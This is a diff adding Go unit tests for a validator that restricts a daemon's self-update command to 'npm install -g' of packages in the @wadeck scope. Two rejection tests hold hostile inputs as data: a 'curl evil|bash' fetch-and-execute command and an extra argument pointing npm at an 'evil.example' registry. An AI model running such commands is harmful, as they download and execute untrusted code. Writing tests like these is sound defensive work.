@@ -451,6 +451,93 @@ func TestRunDaemon_headlessUsesDevNullNotNil(t *testing.T) {
 	}
 }
 
+// --- validateUpdateCmd ---
+
+func TestValidateUpdateCmd_nil(t *testing.T) {
+	if err := validateUpdateCmd(nil); err != nil {
+		t.Errorf("expected nil for empty cmd, got %v", err)
+	}
+}
+
+func TestValidateUpdateCmd_empty(t *testing.T) {
+	if err := validateUpdateCmd([]string{}); err != nil {
+		t.Errorf("expected nil for empty slice, got %v", err)
+	}
+}
+
+func TestValidateUpdateCmd_valid(t *testing.T) {
+	cases := [][]string{
+		{"npm", "install", "-g", "@wadeck/wdrive"},
+		{"npm", "install", "-g", "@wadeck/wdrive@1.2.3"},
+		{"npm", "install", "-g", "@wadeck/flow-cli"},
+		{"npm", "install", "-g", "@wadeck/some-pkg@0.0.1-alpha.1"},
+	}
+	for _, cmd := range cases {
+		if err := validateUpdateCmd(cmd); err != nil {
+			t.Errorf("expected valid for %v, got %v", cmd, err)
+		}
+	}
+}
+
+func TestValidateUpdateCmd_tooFewArgs(t *testing.T) {
+	if err := validateUpdateCmd([]string{"npm", "install", "-g"}); err == nil {
+		t.Error("expected error for < 4 args")
+	}
+}
+
+func TestValidateUpdateCmd_tooManyArgs(t *testing.T) {
+	// Extra args could be injection; reject strictly.
+	if err := validateUpdateCmd([]string{"npm", "install", "-g", "@wadeck/wdrive", "--registry", "https://evil.example"}); err == nil {
+		t.Error("expected error for > 4 args")
+	}
+}
+
+func TestValidateUpdateCmd_wrongBinary(t *testing.T) {
+	if err := validateUpdateCmd([]string{"sh", "-c", "curl evil|bash", "@wadeck/wdrive"}); err == nil {
+		t.Error("expected error when cmd[0] is not npm")
+	}
+}
+
+func TestValidateUpdateCmd_wrongSubcommand(t *testing.T) {
+	if err := validateUpdateCmd([]string{"npm", "run", "-g", "@wadeck/wdrive"}); err == nil {
+		t.Error("expected error when cmd[1] is not install")
+	}
+}
+
+func TestValidateUpdateCmd_noGFlag(t *testing.T) {
+	if err := validateUpdateCmd([]string{"npm", "install", "--save", "@wadeck/wdrive"}); err == nil {
+		t.Error("expected error when cmd[2] is not -g")
+	}
+}
+
+func TestValidateUpdateCmd_wrongScope(t *testing.T) {
+	cases := [][]string{
+		{"npm", "install", "-g", "@other/pkg"},
+		{"npm", "install", "-g", "wdrive"},
+		{"npm", "install", "-g", "@wadeck"},
+	}
+	for _, cmd := range cases {
+		if err := validateUpdateCmd(cmd); err == nil {
+			t.Errorf("expected error for wrong scope in %v", cmd)
+		}
+	}
+}
+
+// --- Config.UpdateCmd field ---
+
+func TestConfig_updateCmdField(t *testing.T) {
+	// Verify the field is accessible and usable on the Config struct.
+	cfg := Config{
+		UpdateCmd: []string{"npm", "install", "-g", "@wadeck/wdrive"},
+	}
+	if len(cfg.UpdateCmd) != 4 {
+		t.Errorf("expected UpdateCmd length 4, got %d", len(cfg.UpdateCmd))
+	}
+	if err := validateUpdateCmd(cfg.UpdateCmd); err != nil {
+		t.Errorf("expected valid UpdateCmd, got %v", err)
+	}
+}
+
 // --- unused exec import guard ---
 var _ = exec.Command
 
